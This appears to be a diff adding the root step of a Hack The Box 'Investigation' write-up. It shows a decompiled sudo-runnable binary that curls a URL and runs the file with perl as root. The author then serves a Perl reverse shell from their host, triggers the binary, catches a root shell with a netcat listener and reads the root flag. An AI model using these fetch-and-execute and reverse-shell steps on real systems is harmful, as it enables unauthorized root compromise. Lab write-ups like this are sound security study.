@@ -307,3 +307,110 @@ h?p?x?�?�?��?�? �?
 ��A������h
 ```
 
+So, I decided to transfer the file to my machine in the same way i did it before. Then, I uploaded the binary file to an [online decompiler](https://dogbolt.org/). From there, I was able to see what the source code looked like.
+
+
+![image](https://user-images.githubusercontent.com/87711310/226178908-6e9a0b49-91e0-4468-b74b-d7b28acccf61.png)
+
+I extracted the program's main function, and it can be seen that it can be broken down into a couple of parts.
+
+```c
+int32_t main(int32_t argc, char** argv, char** envp)
+{
+    if (argc != 3)
+    {
+        puts("Exiting... ");
+        exit(0);
+        /* no return */
+    }
+    if (getuid() != 0)
+    {
+        puts("Exiting... ");
+        exit(0);
+        /* no return */
+    }
+    if (strcmp(argv[2], "lDnxUysaQn") != 0)
+    {
+        puts("Exiting... ");
+        exit(0);
+        /* no return */
+    }
+    puts("Running... ");
+    FILE* rax_8 = fopen(argv[2], &data_2027);
+    int64_t rax_9 = curl_easy_init();
+    int32_t var_40 = 0x2712;
+    curl_easy_setopt(rax_9, 0x2712, argv[1], 0x2712);
+    int32_t var_3c = 0x2711;
+    curl_easy_setopt(rax_9, 0x2711, rax_8, 0x2711);
+    int32_t var_38 = 0x2d;
+    curl_easy_setopt(rax_9, 0x2d, 1, 0x2d);
+    if (curl_easy_perform(rax_9) != 0)
+    {
+        puts("Exiting... ");
+        exit(0);
+        /* no return */
+    }
+    int64_t rax_25 = snprintf(nullptr, 0, &data_202a, argv[2]);
+    char* rax_28 = malloc((rax_25 + 1));
+    snprintf(rax_28, (rax_25 + 1), &data_202a, argv[2]);
+    int64_t rax_37 = snprintf(nullptr, 0, "perl ./%s", rax_28);
+    char* rax_40 = malloc((rax_37 + 1));
+    snprintf(rax_40, (rax_37 + 1), "perl ./%s", rax_28);
+    fclose(rax_8);
+    curl_easy_cleanup(rax_9);
+    setuid(0);
+    system(rax_40);
+    system("rm -f ./lDnxUysaQn");
+    return 0;
+}
+
+```
+
+Analysis the code took me a bit more time, since I wasn't much proficient with coding.
+
+Firstly, it checks whether three input parameters have been sent through (actually two because the first parameter is the program name itself) and exits if not.
+
+Secondly, it checks whether a root user calls it (achievable because we can run it as root without a password) and exits if not.
+
+Thirdly, it checks whether the third parameter is equal to the string `lDnxUysaQn`, and exits if not.
+
+Fourthly, it opens a file with curl which is specified by the second parameter and reads and runs with perl.
+
+And it can be seen that the machine would send the get request to the specified URL.
+
+```
+smorton@investigation:/usr/bin$ sudo /usr/bin/binary 10.10.14.36:4444 lDnxUysaQn
+Running... 
+```
+
+So, then I decided to host a Perl Reverse shell (The I used Perl was to try out somemthing other than python. Using python shell would've also been fine) on my kali.
+
+```
+sudo python3 -m http.server 8081
+```
+
+Then, ran the command following command:
+
+```
+sudo /usr/bin/binary 10.10.14.36:8081/shell.pl lDnxUysaQn
+```
+
+Started a netcat listener on port `4444` before that and boom!!
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
+└─$ nc -lvnp 4444                                                      
+listening on [any] 4444 ...
+connect to [10.10.14.36] from (UNKNOWN) [10.10.11.197] 57548
+root@investigation:/usr/bin# whoami
+whoami
+root
+```
+
+Grabbing the root flag.
+
+```
+root@investigation:/usr/bin# cat /root/root.txt
+cat /root/root.txt
+[REDACTED]
+```
